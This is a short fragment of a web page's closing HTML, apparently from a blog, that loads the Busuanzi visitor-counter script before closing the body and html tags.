+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
